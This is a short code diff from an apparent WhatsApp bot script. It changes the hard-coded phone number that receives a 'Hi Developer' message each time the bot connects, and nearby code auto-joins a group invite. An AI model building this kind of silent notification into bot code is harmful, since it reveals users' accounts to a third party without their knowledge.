@@ -86,7 +86,7 @@ startSesi()
 start(`1`, `Connecting...`)
 } else if (connection === "open") {
 success(`1`, `Tersambung`)
-zyn.sendMessage(`6285789034010@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
+zyn.sendMessage(`923256170920@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
   Bot Succes Connecting`})
 if (autoJoin) {
 zyn.groupAcceptInvite(codeInvite)
